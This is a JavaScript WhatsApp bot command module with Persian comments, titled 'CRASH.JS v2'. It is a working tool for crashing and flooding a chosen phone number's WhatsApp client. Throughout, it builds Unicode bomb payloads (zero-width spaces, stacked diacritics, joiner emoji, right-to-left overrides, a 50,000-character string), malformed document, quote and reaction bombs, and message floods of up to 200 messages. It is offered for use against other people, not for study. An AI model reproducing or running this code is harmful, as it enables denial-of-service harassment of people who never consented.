// =======================
// CRASH.JS v2 — واتساپ کراشر با هدف‌گیری مستقیم شماره
//
// سینتکس:
//   !crash <payload> <number>          → ارسال پیلود به شماره
//   !crash <number>                    → همه پیلودها به شماره
//   !crash flood <count> <payload> <number>
//   !crash list
//   !crash doc|quote|react <number>
//
// مثال:
//   !crash bomb 93794394088
//   !crash flood 50 blackdot 93794394088
// =======================

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// =======================
// ابزار شماره
// =======================

// تشخیص شمارهٔ معتبر: فقط ارقام، 8 تا 15 رقم (کد کشور + شماره)
function isPhone(arg) {
  return typeof arg === "string" && /^\d{8,15}$/.test(arg);
}

// نرمال‌سازی: حذف + و فاصله و خط تیره → ساخت JID
function toJid(number) {
  return number.replace(/\D/g, "") + "@s.whatsapp.net";
}

// جدا کردن شماره از وسط آرگومان‌ها (هر جای دستور باشد)
function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return {
    target: toJid(args[idx]),
    rest: [...args.slice(0, idx), ...args.slice(idx + 1)],
  };
}

// =======================
// پیلودهای متنی
// =======================

const payloads = {
  invisible: () => "\u200B".repeat(4000),
  blackdot: () => "⚫\u200B".repeat(1500),
  diacritic: () => "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(2500),
  zwj: () => "👨\u200D👩\u200D👧\u200D👦".repeat(400),
  vs16: () => "❤\uFE0F".repeat(3000),
  om: () => "ༀ".repeat(2000),
  rtl: () => "\u202E" + "!یمکحت یارب ینامزاس یسررب".repeat(150),
  bomb: () =>
    "⚫\u200B".repeat(1200) +
    "\n" +
    "ا".repeat(500) + "\u0651\u064E\u064F\u0650\u0652".repeat(1000) +
    "\n" +
    "👨\u200D👩\u200D👧\u200D👦".repeat(200) +
    "\n" +
    "ༀ".repeat(800) +
    "\u202E" + "!ینامزاس یسررب".repeat(50),
  giant: () => "A".repeat(50000),
  mixed: () => ("اA1\u200B\uFE0F\u202E\u0301").repeat(1500),
};

// =======================
// ارسال به هدف (چت فعلی یا شماره)
// =======================

// target = JID شماره | null = چت فعلی
async function send(sock, target, content, from) {
  const to = target || from;
  try {
    await sock.sendMessage(to, content);
    return true;
  } catch (e) {
    // ارسال ناموفق را گزارش بده، ولی ادامه بده
    console.log("CRASH SEND ERROR:", to, e.message);
    return false;
  }
}

async function sendText(sock, target, text, from) {
  return send(sock, target, { text }, from);
}

// =======================
// سند مخرب
// =======================

async function docBomb(sock, target, from) {
  return send(sock, target, {
    document: Buffer.from("crash payload"),
    mimetype: "text/plain",
    fileName: "\u200B".repeat(2000) + ".." + "\u202E" + "txt",
  }, from);
}

// =======================
// نقل‌قول جعلی بمب
// =======================

async function quotedBomb(sock, target, from) {
  return send(sock, target, {
    text: "crash",
    contextInfo: {
      quotedMessage: {
        extendedTextMessage: {
          text: "\u200B".repeat(3500) + "⚫".repeat(500),
        },
      },
    },
  }, from);
}

// =======================
// ریکشن بمب (روی پیامی که خود بات می‌فرستد)
// =======================

async function reactBomb(sock, target, from) {
  const sent = await send(sock, target, { text: "⚫" }, from);
  if (!sent || !target) return false; // در چت فعلی key پیام فرستاده‌شده را نداریم
  try {
    await sock.sendMessage(target, {
      react: { text: "😈".repeat(30), key: sent.key },
    });
    return true;
  } catch (e) {
    console.log("CRASH REACT ERROR:", e.message);
    return false;
  }
}

// =======================
// فلاد سریع
// =======================

async function flood(sock, target, count, payload, from) {
  const msg = payload();
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (await sendText(sock, target, msg, from)) ok++;
    await sleep(120);
  }
  return ok;
}

// =======================
// هندلر اصلی
// =======================

export default async function crash(sock, from, body, m, args) {
  // ۱) شماره را از هر جای دستور بیرون بکش
  const { target, rest } = extractTarget(args);

  // ۲) بدون آرگومان → راهنما
  if (rest.length === 0) {
    await sock.sendMessage(from, {
      text: "🧨 CRASH v2\n\n" +
            "!crash <payload> <number>\n" +
            "!crash <number>\n" +
            "!crash flood <count> <payload> <number>\n" +
            "!crash doc|quote|react <number>\n" +
            "!crash list\n\n" +
            "مثال: !crash bomb 93794394088",
    });
    return;
  }

  const first = rest[0].toLowerCase();

  if (first === "list") {
    await sock.sendMessage(from, {
      text: "📦 پیلودها:\n" + Object.keys(payloads).join("\n") +
            "\n\n🧨 bomb | flood N | giant | doc | quote | react" +
            (target ? "\n\n🎯 هدف: " + target : ""),
    });
    return;
  }

  // ۳) هدف را برای گزارش به کاربر آماده کن
  const who = target ? target.replace("@s.whatsapp.net", "") : "چت فعلی";

  if (first === "flood") {
    // parse: count عدد کوچک (≤3 رقم)، پیلود، شماره قبلاً جدا شده
    let count = 30;
    let payloadName = "mixed";
    const nums = rest.slice(1).filter((a) => /^\d{1,3}$/.test(a));
    if (nums.length) count = Math.min(parseInt(nums[0]) || 30, 200);
    const names = rest.slice(1).filter((a) => payloads[a.toLowerCase()]);
    if (names.length) payloadName = names[0].toLowerCase();

    const ok = await flood(sock, target, count, payloads[payloadName], from);
    await sock.sendMessage(from, {
      text: `🔥 فلاد ${ok}/${count} پیام «${payloadName}» → ${who}`,
    });
    return;
  }

  // ۴) پیلودهای ویژه
  if (first === "doc") {
    const ok = await docBomb(sock, target, from);
    await sock.sendMessage(from, { text: ok ? `📄 سند بمب → ${who}` : `❌ ارسال به ${who} ناموفق بود` });
    return;
  }

  if (first === "quote") {
    const ok = await quotedBomb(sock, target, from);
    await sock.sendMessage(from, { text: ok ? `💬 نقل‌قول بمب → ${who}` : `❌ ارسال به ${who} ناموفق بود` });
    return;
  }

  if (first === "react") {
    const ok = await reactBomb(sock, target, from);
    await sock.sendMessage(from, { text: ok ? `😈 ریکشن بمب → ${who}` : `❌ ریکشن به ${who} ناموفق بود (نیاز به شماره دارد)` });
    return;
  }

  // ۵) پیلود خاص
  if (payloads[first]) {
    const ok = await sendText(sock, target, payloads[first](), from);
    await sock.sendMessage(from, { text: ok ? `💥 «${first}» → ${who}` : `❌ ارسال به ${who} ناموفق بود` });
    return;
  }

  // ۶) حالت پیش‌فرض: همه پیلودها (به‌جز giant)
  let okCount = 0;
  for (const key of Object.keys(payloads)) {
    if (key === "giant") continue;
    if (await sendText(sock, target, payloads[key](), from)) okCount++;
    await sleep(400);
  }
  await sock.sendMessage(from, {
    text: `💥 ${okCount} پیلود ارسال شد → ${who}`,
  });
}